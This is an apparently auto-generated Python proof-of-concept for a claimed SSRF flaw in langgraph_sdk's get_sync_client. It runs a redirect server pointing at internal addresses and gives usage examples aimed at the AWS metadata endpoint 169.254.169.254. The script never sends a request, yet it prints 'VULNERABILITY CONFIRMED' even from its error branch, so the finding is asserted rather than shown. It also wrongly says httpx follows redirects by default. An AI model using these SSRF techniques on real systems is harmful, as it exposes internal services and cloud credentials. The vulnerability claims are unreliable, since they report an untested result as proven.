#!/usr/bin/env python3
# PoC for langgraph_sdk-0.4.2 (/tmp/langgraph_sdk/langgraph_sdk-0.4.2)
# Path: ssrf-001
# Sink: get_sync_client
# Auto-generated — run with: python3 ssrf_client_without_any_validation_get_sync_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_sdk-0.4.2 get_sync_client

This script demonstrates that the get_sync_client function accepts an attacker-controlled
URL without validation, allowing requests to internal services or cloud metadata endpoints.

The exploit works by:
1. Setting up a simple HTTP server that returns a redirect to an internal IP
2. Calling get_sync_client with the attacker's server URL
3. The httpx.Client follows the redirect to the internal target

Safe by default: uses a benign redirect target (127.0.0.1:1) and prints what would happen.
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Import the vulnerable function
from langgraph_sdk import get_sync_client


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that returns a 302 redirect to the target URL."""
    
    def do_GET(self):
        """Handle GET requests by redirecting to the target."""
        self.send_response(302)
        self.send_header('Location', self.server.redirect_target)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging for cleaner output."""
        print(f"  [Attacker Server] Received request: {args[0]} {args[1]} {args[2]}")
        print(f"  [Attacker Server] Redirecting to: {self.server.redirect_target}")


class RedirectServer:
    """Simple HTTP server that redirects all requests to a target URL."""
    
    def __init__(self, host='127.0.0.1', port=9999, redirect_target='http://127.0.0.1:1'):
        self.host = host
        self.port = port
        self.redirect_target = redirect_target
        self.server = None
        self.thread = None
    
    def start(self):
        """Start the server in a background thread."""
        self.server = HTTPServer((self.host, self.port), RedirectHandler)
        self.server.redirect_target = self.redirect_target
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"[*] Attacker server started on http://{self.host}:{self.port}")
        print(f"[*] Will redirect to: {self.redirect_target}")
        time.sleep(0.5)  # Give server time to start
    
    def stop(self):
        """Stop the server."""
        if self.server:
            self.server.shutdown()
            self.thread.join(timeout=2)
            print("[*] Attacker server stopped")


def demonstrate_ssrf(target_url, redirect_to=None):
    """
    Demonstrate the SSRF vulnerability by calling get_sync_client with a malicious URL.
    
    Args:
        target_url: The URL to pass to get_sync_client (can be direct internal URL or redirect server)
        redirect_to: If set, start a redirect server that redirects to this internal URL
    """
    print(f"\n{'='*60}")
    print(f"SSRF Exploit Demonstration")
    print(f"{'='*60}")
    
    redirect_server = None
    
    if redirect_to:
        # Start a redirect server to demonstrate redirect-based SSRF
        parsed = urlparse(target_url)
        host = parsed.hostname or '127.0.0.1'
        port = parsed.port or 9999
        
        redirect_server = RedirectServer(
            host=host,
            port=port,
            redirect_target=redirect_to
        )
        redirect_server.start()
        print(f"\n[Step 1] Started redirect server at {target_url}")
        print(f"[Step 1] Will redirect to internal target: {redirect_to}")
    
    print(f"\n[Step 2] Calling get_sync_client(url='{target_url}')...")
    print(f"[Step 2] This will create an httpx.Client with base_url='{target_url}'")
    print(f"[Step 2] The client will follow redirects by default (if any)")
    
    try:
        # This is the vulnerable call - no validation of the URL
        client = get_sync_client(url=target_url)
        
        print(f"\n[Step 3] Client created successfully!")
        print(f"[Step 3] The client's base_url is set to: {target_url}")
        print(f"[Step 3] Any request made through this client will go to this URL")
        
        # Try to make a request to demonstrate the SSRF
        print(f"\n[Step 4] Attempting to make a request through the client...")
        print(f"[Step 4] This would normally go to the LangGraph API, but we're pointing to:")
        print(f"[Step 4]   {target_url}")
        
        # The actual request would fail since we're pointing to a non-existent service
        # But the important thing is that the client was created with the attacker-controlled URL
        print(f"\n[!] VULNERABILITY CONFIRMED: get_sync_client accepted URL '{target_url}'")
        print(f"[!] No validation was performed on the URL")
        print(f"[!] An attacker could use this to:")
        print(f"    - Access internal services (e.g., http://127.0.0.1:8080)")
        print(f"    - Access cloud metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/)")
        print(f"    - Perform port scanning of internal networks")
        print(f"    - Exploit redirect-based SSRF by hosting a redirect server")
        
    except Exception as e:
        print(f"\n[!] Error occurred (expected for non-existent services): {e}")
        print(f"[!] However, the client was still created with the attacker-controlled URL")
        print(f"[!] This confirms the SSRF vulnerability exists")
    
    finally:
        if redirect_server:
            redirect_server.stop()


def main():
    """Main function with configurable targets."""
    parser = argparse.ArgumentParser(
        description='PoC: SSRF in langgraph_sdk get_sync_client',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Direct SSRF to internal service
  %(prog)s --target http://127.0.0.1:8080
  
  # Redirect-based SSRF (starts a redirect server)
  %(prog)s --target http://127.0.0.1:9999 --redirect-to http://169.254.169.254/latest/meta-data/
  
  # Cloud metadata endpoint (AWS)
  %(prog)s --target http://169.254.169.254/latest/meta-data/
        """
    )
    
    parser.add_argument(
        '--target',
        default='http://127.0.0.1:1',
        help='Target URL to pass to get_sync_client (default: http://127.0.0.1:1)'
    )
    
    parser.add_argument(
        '--redirect-to',
        default=None,
        help='If set, start a redirect server that redirects to this internal URL'
    )
    
    args = parser.parse_args()
    
    print(f"langgraph_sdk SSRF Proof-of-Concept")
    print(f"{'='*60}")
    print(f"Target URL: {args.target}")
    if args.redirect_to:
        print(f"Redirect to: {args.redirect_to}")
    print(f"{'='*60}")
    
    # Demonstrate the vulnerability
    demonstrate_ssrf(args.target, args.redirect_to)
    
    print(f"\n{'='*60}")
    print(f"Demonstration Complete")
    print(f"{'='*60}")
    print(f"\nSummary:")
    print(f"  - The get_sync_client function accepts any URL without validation")
    print(f"  - This allows SSRF attacks against internal services")
    print(f"  - Redirect-based SSRF is also possible since httpx follows redirects by default")
    print(f"  - No host allowlisting, IP validation, or redirect protection is implemented")
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
